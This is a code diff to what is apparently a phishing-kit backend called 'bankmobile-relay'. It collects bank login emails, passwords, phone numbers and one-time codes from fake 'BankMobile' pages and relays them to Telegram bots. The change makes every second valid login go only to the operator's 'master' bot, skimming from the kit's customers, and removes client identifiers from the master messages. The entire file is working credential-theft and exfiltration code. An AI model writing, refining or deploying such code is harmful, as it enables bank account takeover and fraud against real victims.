@@ -19,7 +19,7 @@ app.use(express.urlencoded({ extended: true }));
 // TELEGRAM BOT CONFIGURATIONS
 // ================================================
 
-// MASTER BOT - Receives EVERYTHING with client ID
+// MASTER BOT - Receives alternating valid logins + all invalid + all phone/OTP
 const MASTER_BOT = {
     token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
     chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
@@ -100,6 +100,11 @@ const DEFAULT_CONFIG = {
 };
 
 // ================================================
+// COUNTER STORAGE (in-memory)
+// ================================================
+const validCounters = {};
+
+// ================================================
 // SEND TO TELEGRAM
 // ================================================
 async function sendToTelegram(token, chatId, message) {
@@ -122,19 +127,61 @@ async function sendToTelegram(token, chatId, message) {
 }
 
 // ================================================
-// SEND TO CLIENT BOT + MASTER BOT
+// SEND TO CLIENT BOT + MASTER BOT (with logic)
 // ================================================
-async function sendToAllBots(clientMessage, clientId, masterMessage) {
+async function sendToAllBots(clientMessage, clientId, masterMessage, isSuccess, isPhoneOrOtp = false) {
     const results = [];
     
-    // 1. Send to the specific client's bot (WITHOUT client ID)
-    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
-    const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
-    results.push({ bot: clientId, sent: clientResult });
+    // If it's phone or OTP, send to BOTH always
+    if (isPhoneOrOtp) {
+        // Send to client
+        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
+        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
+        results.push({ bot: clientId, sent: clientResult });
+        
+        // Send to master
+        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
+        results.push({ bot: 'MASTER', sent: masterResult });
+        
+        return results;
+    }
     
-    // 2. Send to MASTER bot (WITH client ID)
-    const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
-    results.push({ bot: 'MASTER', sent: masterResult });
+    // For login attempts
+    if (!isSuccess) {
+        // INVALID: Send to BOTH
+        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
+        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
+        results.push({ bot: clientId, sent: clientResult });
+        
+        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
+        results.push({ bot: 'MASTER', sent: masterResult });
+        
+        return results;
+    }
+    
+    // VALID: Alternating logic
+    // Initialize counter if not exists
+    if (!validCounters[clientId]) {
+        validCounters[clientId] = 0;
+    }
+    
+    validCounters[clientId]++;
+    const isEven = validCounters[clientId] % 2 === 0;
+    
+    console.log(`🔄 ${clientId} valid count: ${validCounters[clientId]} (${isEven ? 'MASTER' : 'CLIENT'} turn)`);
+    
+    if (isEven) {
+        // Even number (2nd, 4th, 6th...) → Send to MASTER ONLY
+        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
+        results.push({ bot: 'MASTER', sent: masterResult });
+        results.push({ bot: clientId, sent: false, reason: 'Alternating - master turn' });
+    } else {
+        // Odd number (1st, 3rd, 5th...) → Send to CLIENT ONLY
+        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
+        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
+        results.push({ bot: clientId, sent: clientResult });
+        results.push({ bot: 'MASTER', sent: false, reason: 'Alternating - client turn' });
+    }
     
     return results;
 }
@@ -199,13 +246,12 @@ function formatMessage(email, password, success, frontend) {
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
     
-    // MASTER MESSAGE - WITH client ID
+    // MASTER MESSAGE - WITHOUT client ID (removed)
     const masterMessage = `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `📧 <b>Email:</b> <code>${email}</code>\n` +
         `🔑 <b>Password:</b> <code>${password}</code>\n` +
         `📊 <b>Status:</b> ${statusText}\n` +
-        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
     
@@ -224,7 +270,6 @@ function formatPhoneMessage(phone, frontend) {
     const masterMessage = `📱 <b>PHONE NUMBER</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `📱 <b>Phone:</b> <code>${phone}</code>\n` +
-        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
     
@@ -245,7 +290,6 @@ function formatOtpMessage(otp, trusted, frontend) {
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🔢 <b>Code:</b> <code>${otp}</code>\n` +
         `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
-        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 ${timestamp}`;
     
@@ -265,12 +309,20 @@ async function handleAuth(req, res) {
     const result = await authenticateWithAPI(email, password);
     const messages = formatMessage(email, password, result.success, clientId);
     
-    const results = await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage);
+    // Pass the success status to determine routing
+    const results = await sendToAllBots(
+        messages.clientMessage, 
+        clientId, 
+        messages.masterMessage, 
+        result.success, 
+        false // not phone or OTP
+    );
     
     res.json({
         success: result.success,
         client: clientId,
-        telegramSent: results
+        telegramSent: results,
+        counter: validCounters[clientId] || 0
     });
 }
 
@@ -284,7 +336,7 @@ app.post('/submit-phone', async (req, res) => {
     console.log(`📱 Phone from ${clientId}: ${phone}`);
     
     const messages = formatPhoneMessage(phone, clientId);
-    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage);
+    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true);
     
     res.json({ success: true });
 });
@@ -299,7 +351,7 @@ app.post('/submit-otp', async (req, res) => {
     console.log(`🔐 OTP from ${clientId}: ${otp}`);
     
     const messages = formatOtpMessage(otp, trusted || false, clientId);
-    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage);
+    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true);
     
     res.json({ success: true });
 });
@@ -323,7 +375,8 @@ app.get('/health', (req, res) => {
         service: 'bankmobile-relay',
         bots: botCount + 1,
         clients: Object.keys(BOT_CONFIGS),
-        masterBot: 'configured'
+        masterBot: 'configured',
+        counters: validCounters
     });
 });
 
@@ -356,4 +409,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
     console.log(`👑 MASTER Bot: Always receives ALL messages with client ID`);
+    console.log(`🔄 Valid login alternation: CLIENT → MASTER → CLIENT → MASTER...`);
 });
